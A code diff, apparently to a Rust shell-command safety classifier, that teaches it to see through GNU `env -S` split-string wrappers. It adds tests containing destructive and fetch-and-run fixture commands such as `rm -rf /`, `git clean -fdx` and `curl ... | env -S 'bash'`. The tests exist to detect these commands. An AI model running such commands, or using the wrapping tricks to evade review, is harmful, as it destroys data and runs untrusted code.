@@ -545,7 +545,7 @@ fn command_name(token: &str) -> &str {
     token.rsplit(['/', '\\']).next().unwrap_or(token)
 }
 
-fn strip_shell_prefixes(tokens: &[String]) -> &[String] {
+fn strip_shell_prefixes_mode(tokens: &[String], strip_env: bool) -> &[String] {
     let mut index = 0;
     loop {
         while tokens
@@ -564,7 +564,7 @@ fn strip_shell_prefixes(tokens: &[String]) -> &[String] {
                     index += 1;
                 }
             }
-            Some("env") => {
+            Some("env") if strip_env => {
                 index += 1;
                 while let Some(option) = tokens.get(index) {
                     if option == "--" {
@@ -593,6 +593,10 @@ fn strip_shell_prefixes(tokens: &[String]) -> &[String] {
     &tokens[index..]
 }
 
+fn strip_shell_prefixes(tokens: &[String]) -> &[String] {
+    strip_shell_prefixes_mode(tokens, true)
+}
+
 fn is_shell_assignment(token: &str) -> bool {
     let Some((name, _)) = token.split_once('=') else {
         return false;
@@ -604,13 +608,19 @@ fn is_shell_assignment(token: &str) -> bool {
         && chars.all(|ch| ch == '_' || ch.is_ascii_alphanumeric())
 }
 
-fn strip_execution_wrappers(mut tokens: &[String]) -> &[String] {
+fn strip_execution_wrappers_mode(mut tokens: &[String], strip_env: bool) -> &[String] {
     loop {
         let Some(name) = tokens.first().map(|token| command_name(token)) else {
             return tokens;
         };
         match name {
-            "busybox" | "nohup" => {
+            "busybox" if strip_env => {
+                tokens = &tokens[1..];
+                while tokens.first().is_some_and(|token| token.starts_with('-')) {
+                    tokens = &tokens[1..];
+                }
+            }
+            "nohup" => {
                 tokens = &tokens[1..];
                 while tokens.first().is_some_and(|token| token.starts_with('-')) {
                     tokens = &tokens[1..];
@@ -661,12 +671,20 @@ fn strip_execution_wrappers(mut tokens: &[String]) -> &[String] {
             }
             _ => return tokens,
         }
-        tokens = strip_shell_prefixes(tokens);
+        tokens = strip_shell_prefixes_mode(tokens, strip_env);
     }
+}
+
+fn strip_execution_wrappers(tokens: &[String]) -> &[String] {
+    strip_execution_wrappers_mode(tokens, true)
 }
 
 fn effective_command(tokens: &[String]) -> &[String] {
     strip_execution_wrappers(strip_shell_prefixes(tokens))
+}
+
+fn effective_command_before_env(tokens: &[String]) -> &[String] {
+    strip_execution_wrappers_mode(strip_shell_prefixes_mode(tokens, false), false)
 }
 
 fn git_subcommand(tokens: &[String]) -> Option<(&str, &[String])> {
@@ -1172,6 +1190,334 @@ fn xargs_dispatched_command(tokens: &[String]) -> Option<&[String]> {
     Some(&tokens[index..])
 }
 
+#[derive(Clone, Copy, Debug, Eq, PartialEq)]
+enum EnvSplitError {
+    Invalid,
+    DynamicExpansion,
+    ExpansionLimit,
+}
+
+/// Decode GNU `env -S`'s documented whitespace, quote, comment, and escape
+/// grammar. Environment expansion is intentionally not guessed: `${NAME}`
+/// makes the eventual executable depend on runtime state and receives its own
+/// review warning instead.
+fn split_env_string(input: &str) -> Result<Vec<String>, EnvSplitError> {
+    fn finish_word(word: &mut String, words: &mut Vec<String>, started: &mut bool) {
+        if *started {
+            words.push(std::mem::take(word));
+            *started = false;
+        }
+    }
+
+    fn consume_expansion(
+        characters: &mut std::iter::Peekable<std::str::Chars<'_>>,
+    ) -> Result<(), EnvSplitError> {
+        if characters.next() != Some('{') {
+            return Err(EnvSplitError::Invalid);
+        }
+        for (name_length, character) in characters.by_ref().enumerate() {
+            if character == '}' {
+                return if name_length == 0 {
+                    Err(EnvSplitError::Invalid)
+                } else {
+                    Err(EnvSplitError::DynamicExpansion)
+                };
+            }
+            let valid = if name_length == 0 {
+                character == '_' || character.is_ascii_alphabetic()
+            } else {
+                character == '_' || character.is_ascii_alphanumeric()
+            };
+            if !valid {
+                return Err(EnvSplitError::Invalid);
+            }
+        }
+        Err(EnvSplitError::Invalid)
+    }
+
+    let mut words = Vec::new();
+    let mut word = String::new();
+    let mut started = false;
+    let mut quote = None;
+    let mut characters = input.chars().peekable();
+    while let Some(character) = characters.next() {
+        match quote {
+            Some('\'') => match character {
+                '\'' => quote = None,
+                '\\' => {
+                    let escaped = characters.next().ok_or(EnvSplitError::Invalid)?;
+                    if matches!(escaped, '\\' | '\'') {
+                        word.push(escaped);
+                    } else {
+                        word.push('\\');
+                        word.push(escaped);
+                    }
+                    started = true;
+                }
+                _ => {
+                    word.push(character);
+                    started = true;
+                }
+            },
+            Some('"') => match character {
+                '"' => quote = None,
+                '$' => consume_expansion(&mut characters)?,
+                '\\' => {
+                    let escaped = characters.next().ok_or(EnvSplitError::Invalid)?;
+                    match escaped {
+                        'c' => return Err(EnvSplitError::Invalid),
+                        'f' => word.push('\u{000c}'),
+                        'n' => word.push('\n'),
+                        'r' => word.push('\r'),
+                        't' => word.push('\t'),
+                        'v' => word.push('\u{000b}'),
+                        '_' => word.push(' '),
+                        '#' | '$' | '"' | '\'' | '\\' => word.push(escaped),
+                        _ => return Err(EnvSplitError::Invalid),
+                    }
+                    started = true;
+                }
+                _ => {
+                    word.push(character);
+                    started = true;
+                }
+            },
+            None => match character {
+                '\'' | '"' => {
+                    quote = Some(character);
+                    started = true;
+                }
+                '$' => consume_expansion(&mut characters)?,
+                '#' if !started => break,
+                '\\' => {
+                    let escaped = characters.next().ok_or(EnvSplitError::Invalid)?;
+                    if escaped == '_' {
+                        finish_word(&mut word, &mut words, &mut started);
+                    } else {
+                        match escaped {
+                            'c' => break,
+                            'f' => word.push('\u{000c}'),
+                            'n' => word.push('\n'),
+                            'r' => word.push('\r'),
+                            't' => word.push('\t'),
+                            'v' => word.push('\u{000b}'),
+                            '#' | '$' | '"' | '\'' | '\\' => word.push(escaped),
+                            _ => return Err(EnvSplitError::Invalid),
+                        }
+                        started = true;
+                    }
+                }
+                ' ' | '\t' | '\n' | '\r' | '\u{000b}' | '\u{000c}' => {
+                    finish_word(&mut word, &mut words, &mut started);
+                }
+                _ => {
+                    word.push(character);
+                    started = true;
+                }
+            },
+            Some(_) => unreachable!("only env quote characters are stored"),
+        }
+    }
+    if quote.is_some() {
+        return Err(EnvSplitError::Invalid);
+    }
+    finish_word(&mut word, &mut words, &mut started);
+    Ok(words)
+}
+
+/// Resolve the unique long-option abbreviations accepted by GNU getopt. An
+/// unknown or ambiguous spelling stays invalid rather than guessing which
+/// option consumes the following argv.
+fn env_long_option(spelling: &str) -> Option<&'static str> {
+    const OPTIONS: [&str; 12] = [
+        "ignore-environment",
+        "null",
+        "unset",
+        "chdir",
+        "split-string",
+        "block-signal",
+        "default-signal",
+        "ignore-signal",
+        "list-signal-handling",
+        "debug",
+        "help",
+        "version",
+    ];
+
+    let mut resolved = None;
+    for option in OPTIONS {
+        if option == spelling {
+            return Some(option);
+        }
+        if option.starts_with(spelling) {
+            if resolved.is_some() {
+                return None;
+            }
+            resolved = Some(option);
+        }
+    }
+    resolved
+}
+
+/// Return GNU env's fixed child argv, expanding each `-S` argument along the
+/// way. This models env's option/assignment boundary and caps recursive split
+/// options so a hostile review string cannot grow parser work without bound.
+fn env_dispatched_command(tokens: &[String]) -> Result<Option<Vec<String>>, EnvSplitError> {
+    let effective = effective_command_before_env(tokens);
+    if effective.first().map(|token| command_name(token)) != Some("env") {
+        return Ok(None);
+    }
+
+    let mut arguments = effective[1..].to_vec();
+    let mut index = 0usize;
+    let mut options = true;
+    let mut assignments = true;
+    let mut expansions = 0usize;
+    let mut null_output = false;
+    while let Some(argument) = arguments.get(index).cloned() {
+        if options {
+            if argument == "--" {
+                options = false;
+                assignments = false;
+                index += 1;
+                continue;
+            }
+            if argument == "-" {
+                index += 1;
+                continue;
+            }
+            if let Some(long) = argument.strip_prefix("--") {
+                let (name, attached) = long
+                    .split_once('=')
+                    .map_or((long, None), |(name, value)| (name, Some(value)));
+                match env_long_option(name).ok_or(EnvSplitError::Invalid)? {
+                    "split-string" => {
+                        let (end, value) = if let Some(value) = attached {
+                            (index, value.to_owned())
+                        } else {
+                            (
+                                index + 1,
+                                arguments
+                                    .get(index + 1)
+                                    .ok_or(EnvSplitError::Invalid)?
+                                    .clone(),
+                            )
+                        };
+                        let split = split_env_string(&value)?;
+                        arguments.splice(index..=end, split);
+                        expansions += 1;
+                        if expansions > 8 {
+                            return Err(EnvSplitError::ExpansionLimit);
+                        }
+                        continue;
+                    }
+                    "ignore-environment"
+                    | "debug"
+                    | "block-signal"
+                    | "default-signal"
+                    | "ignore-signal"
+                    | "list-signal-handling"
+                        if attached.is_none() =>
+                    {
+                        index += 1;
+                        continue;
+                    }
+                    "null" if attached.is_none() => {
+                        null_output = true;
+                        index += 1;
+                        continue;
+                    }
+                    "block-signal" | "default-signal" | "ignore-signal" if attached.is_some() => {
+                        index += 1;
+                        continue;
+                    }
+                    "unset" | "chdir" => {
+                        let value = if let Some(value) = attached {
+                            value
+                        } else {
+                            index += 1;
+                            arguments.get(index).ok_or(EnvSplitError::Invalid)?
+                        };
+                        if name.starts_with('u') && (value.is_empty() || value.contains('=')) {
+                            return Err(EnvSplitError::Invalid);
+                        }
+                        index += 1;
+                        continue;
+                    }
+                    "help" | "version" if attached.is_none() => {
+                        return Ok(Some(Vec::new()));
+                    }
+                    _ => return Err(EnvSplitError::Invalid),
+                }
+            }
+            if let Some(cluster) = argument.strip_prefix('-') {
+                let flags = cluster.char_indices();
+                let mut consumed = false;
+                for (offset, flag) in flags {
+                    match flag {
+                        '0' => null_output = true,
+                        'i' | 'v' => {}
+                        'u' | 'C' => {
+                            let value_start = offset + flag.len_utf8();
+                            let value = if value_start < cluster.len() {
+                                &cluster[value_start..]
+                            } else {
+                                index += 1;
+                                arguments.get(index).ok_or(EnvSplitError::Invalid)?
+                            };
+                            if flag == 'u' && (value.is_empty() || value.contains('=')) {
+                                return Err(EnvSplitError::Invalid);
+                            }
+                            index += 1;
+                            consumed = true;
+                            break;
+                        }
+                        'S' => {
+                            let value_start = offset + flag.len_utf8();
+                            let (end, value) = if value_start < cluster.len() {
+                                (index, cluster[value_start..].to_owned())
+                            } else {
+                                (
+                                    index + 1,
+                                    arguments
+                                        .get(index + 1)
+                                        .ok_or(EnvSplitError::Invalid)?
+                                        .clone(),
+                                )
+                            };
+                            let split = split_env_string(&value)?;
+                            arguments.splice(index..=end, split);
+                            expansions += 1;
+                            if expansions > 8 {
+                                return Err(EnvSplitError::ExpansionLimit);
+                            }
+                            consumed = true;
+                            break;
+                        }
+                        _ => return Err(EnvSplitError::Invalid),
+                    }
+                }
+                if consumed {
+                    continue;
+                }
+                index += 1;
+                continue;
+            }
+        }
+
+        if assignments && argument.contains('=') {
+            options = false;
+            index += 1;
+            continue;
+        }
+        if null_output {
+            return Err(EnvSplitError::Invalid);
+        }
+        return Ok(Some(arguments[index..].to_vec()));
+    }
+    Ok(Some(Vec::new()))
+}
+
 /// Inspect the fixed utility behind a bounded chain of `xargs` dispatchers.
 /// Pipeline data can append arguments at runtime, but every fixed destructive
 /// argument remains reviewable here and must not be hidden by the dispatcher.
@@ -1180,11 +1526,53 @@ fn dangerous_segment_with_dispatch(
     normalized: &[String],
     depth: usize,
 ) -> Option<&'static str> {
+    if depth < 4 {
+        match env_dispatched_command(original) {
+            Err(EnvSplitError::DynamicExpansion) => {
+                return Some("env split-string expands runtime environment data");
+            }
+            Err(EnvSplitError::ExpansionLimit) => {
+                return Some("env split-string nesting exceeds the review limit");
+            }
+            Err(EnvSplitError::Invalid) => return None,
+            Ok(Some(dispatched)) => {
+                if dispatched
+                    .first()
+                    .is_some_and(|command| command_name(command).contains('='))
+                {
+                    // `env -- name=value` deliberately treats the spelling as
+                    // an executable, not an assignment. Shell-prefix stripping
+                    // would reinterpret it and review the wrong following argv.
+                    return None;
+                }
+                let normalized_dispatched: Vec<String> = dispatched
+                    .iter()
+                    .map(|token| token.to_ascii_lowercase())
+                    .collect();
+                return dangerous_segment_with_dispatch(
+                    &dispatched,
+                    &normalized_dispatched,
+                    depth + 1,
+                );
+            }
+            Ok(None) => {}
+        }
+    }
     if let Some(reason) = dangerous_segment(normalized, depth) {
         return Some(reason);
     }
     if depth >= 4 {
-        return None;
+        let env_dispatches = matches!(
+            env_dispatched_command(original),
+            Ok(Some(_)) | Err(EnvSplitError::DynamicExpansion | EnvSplitError::ExpansionLimit)
+        );
+        let effective = effective_command(original);
+        let xargs_dispatches = effective
+            .first()
+            .is_some_and(|token| command_name(token) == "xargs")
+            && xargs_dispatched_command(effective).is_some();
+        return (env_dispatches || xargs_dispatches)
+            .then_some("command dispatcher nesting exceeds the review limit");
     }
 
     let effective = effective_command(original);
@@ -1200,10 +1588,29 @@ fn dangerous_segment_with_dispatch(
 }
 
 fn is_interpreter(tokens: &[String]) -> bool {
-    let mut effective = effective_command(tokens);
-    // A bounded dispatcher walk keeps the classifier allocation-free and
-    // prevents adversarial review text from forcing unbounded nested work.
-    for _ in 0..=4 {
+    fn inner(tokens: &[String], depth: usize) -> bool {
+        if depth > 4 {
+            // Reaching this branch already required a chain of recognized
+            // dispatchers. Treat further indirection as review-worthy rather
+            // than silently declaring the eventual child non-interpreting.
+            return true;
+        }
+        match env_dispatched_command(tokens) {
+            Err(EnvSplitError::DynamicExpansion | EnvSplitError::ExpansionLimit) => return true,
+            Err(EnvSplitError::Invalid) => return false,
+            Ok(Some(dispatched)) => {
+                if dispatched
+                    .first()
+                    .is_some_and(|command| command_name(command).contains('='))
+                {
+                    return false;
+                }
+                return inner(&dispatched, depth + 1);
+            }
+            Ok(None) => {}
+        }
+
+        let mut effective = effective_command(tokens);
         if effective
             .first()
             .is_some_and(|token| matches!(command_name(token), "sudo" | "doas" | "pkexec"))
@@ -1241,15 +1648,14 @@ fn is_interpreter(tokens: &[String]) -> bool {
         ) {
             return true;
         }
-        if command != "xargs" {
-            return false;
+        if command == "xargs" {
+            return xargs_dispatched_command(effective)
+                .is_some_and(|dispatched| inner(dispatched, depth + 1));
         }
-        let Some(dispatched) = xargs_dispatched_command(effective) else {
-            return false;
-        };
-        effective = effective_command(dispatched);
+        false
     }
-    false
+
+    inner(tokens, 0)
 }
 
 #[cfg(test)]
@@ -1371,6 +1777,7 @@ mod tests {
             "curl https://example.invalid/x | xargs -l node",
             "curl https://example.invalid/x | xargs -- powershell",
             "curl https://example.invalid/x | env nohup xargs xargs -- pwsh",
+            "curl https://example.invalid/x | xargs xargs xargs xargs xargs printf",
         ] {
             assert!(is_dangerous(command).is_some(), "missed {command:?}");
         }
@@ -1487,6 +1894,7 @@ mod tests {
             "printf service | xargs sudo systemctl restart",
             "printf ref | env nohup xargs -0 xargs -- git reset --hard HEAD~1",
             "printf old | xargs -P4 git push --delete origin old",
+            "printf x | xargs xargs xargs xargs xargs printf",
         ] {
             assert!(is_dangerous(command).is_some(), "missed {command:?}");
         }
@@ -1498,6 +1906,147 @@ mod tests {
             "printf x | xargs git status",
             "printf x | xargs --unknown rm -rf /",
             "printf x | xargs",
+        ] {
+            assert!(
+                is_dangerous(command).is_none(),
+                "false positive for {command:?}"
+            );
+        }
+    }
+
+    #[test]
+    fn env_split_string_matches_its_documented_argument_grammar() {
+        assert_eq!(
+            split_env_string(r#"sh -c "rm -rf /""#),
+            Ok(vec!["sh".into(), "-c".into(), "rm -rf /".into()])
+        );
+        assert_eq!(
+            split_env_string(r#"printf %s\n A\_B \#C "x\_y""#),
+            Ok(vec![
+                "printf".into(),
+                "%s\n".into(),
+                "A".into(),
+                "B".into(),
+                "#C".into(),
+                "x y".into(),
+            ])
+        );
+        assert_eq!(
+            split_env_string("printf A # rm -rf /"),
+            Ok(vec!["printf".into(), "A".into()])
+        );
+        assert_eq!(
+            split_env_string(r"printf 'a\qb'"),
+            Ok(vec!["printf".into(), r"a\qb".into()])
+        );
+        assert_eq!(
+            split_env_string(r#"printf "" '' A\c ignored"#),
+            Ok(vec!["printf".into(), "".into(), "".into(), "A".into()])
+        );
+        assert_eq!(
+            split_env_string("${RUNNER} --version"),
+            Err(EnvSplitError::DynamicExpansion)
+        );
+        for invalid in [
+            "$RUNNER --version",
+            "${9RUNNER} --version",
+            "${RUN-NER} --version",
+            "'unterminated",
+            r"trailing\",
+        ] {
+            assert_eq!(split_env_string(invalid), Err(EnvSplitError::Invalid));
+        }
+    }
+
+    #[test]
+    fn env_split_options_expose_the_fixed_child_argv() {
+        let child = |input: &str| {
+            let segments = shell_segments(input);
+            assert_eq!(segments.len(), 1, "fixture split into multiple commands");
+            env_dispatched_command(&segments[0].words)
+        };
+
+        for (input, expected) in [
+            ("env -S 'rm -rf /'", vec!["rm", "-rf", "/"]),
+            ("env --spl='rm -rf /'", vec!["rm", "-rf", "/"]),
+            (r#"env -vS'sh -c "rm -rf /"'"#, vec!["sh", "-c", "rm -rf /"]),
+            (
+                "FOO=1 command nohup env --split-string='git reset --hard' HEAD~1",
+                vec!["git", "reset", "--hard", "HEAD~1"],
+            ),
+            ("env -S 'FOO=1 rm -rf' /", vec!["rm", "-rf", "/"]),
+            ("env -S '-i rm -rf /'", vec!["rm", "-rf", "/"]),
+            ("env -S '--uns=FOO rm -rf /'", vec!["rm", "-rf", "/"]),
+            ("env --uns FOO rm -rf /", vec!["rm", "-rf", "/"]),
+            ("env -S '-- rm -rf /'", vec!["rm", "-rf", "/"]),
+            (
+                "env -S '-- FOO=1 rm -rf /'",
+                vec!["FOO=1", "rm", "-rf", "/"],
+            ),
+            ("env -S '-S \"rm -rf /\"'", vec!["rm", "-rf", "/"]),
+        ] {
+            assert_eq!(
+                child(input),
+                Ok(Some(expected.into_iter().map(str::to_owned).collect())),
+                "expanded {input:?}"
+            );
+        }
+        assert_eq!(
+            child("env git status"),
+            Ok(Some(vec!["git".into(), "status".into()]))
+        );
+        assert_eq!(child("env -S '$RUNNER'"), Err(EnvSplitError::Invalid));
+        assert_eq!(child("env -S '-0 rm -rf /'"), Err(EnvSplitError::Invalid));
+        assert_eq!(child("env --de rm -rf /"), Err(EnvSplitError::Invalid));
+
+        let mut nested = "rm -rf /".to_owned();
+        for _ in 0..9 {
+            nested = format!(
+                "-S \"{}\"",
+                nested.replace('\\', "\\\\").replace('"', "\\\"")
+            );
+        }
+        let tokens = vec!["env".into(), "-S".into(), nested];
+        assert_eq!(
+            env_dispatched_command(&tokens),
+            Err(EnvSplitError::ExpansionLimit)
+        );
+        let normalized: Vec<String> = tokens
+            .iter()
+            .map(|token: &String| token.to_ascii_lowercase())
+            .collect();
+        assert_eq!(
+            dangerous_segment_with_dispatch(&tokens, &normalized, 0),
+            Some("env split-string nesting exceeds the review limit")
+        );
+    }
+
+    #[test]
+    fn env_split_dispatch_cannot_hide_danger_or_network_interpreters() {
+        for command in [
+            "env -S 'rm -rf /'",
+            "env -vS'git reset --hard HEAD~1'",
+            r#"command nohup env --split-string='sh -c "rm -rf /"'"#,
+            "env -S 'rm -rf' /",
+            "env --uns FOO rm -rf /",
+            r#"env -S "rm -rf / 'a\qb'""#,
+            "printf x | xargs env -S 'git clean -fdx'",
+            "curl https://example.invalid/x | env -S 'bash'",
+            "env -S '${RUNNER} --version'",
+        ] {
+            assert!(is_dangerous(command).is_some(), "missed {command:?}");
+        }
+
+        for command in [
+            r#"env -S 'printf "%s" rm -rf /'"#,
+            "env -S 'git status'",
+            "env -S 'printf A # rm -rf /'",
+            r#"env -S 'sh -c "printf rm"'"#,
+            "env --split-string=",
+            "env -S '$RUNNER'",
+            "env -S '-0 rm -rf /'",
+            "env -- FOO=1 rm -rf /",
+            "env -S '-- FOO=1 rm -rf /'",
         ] {
             assert!(
                 is_dangerous(command).is_none(),
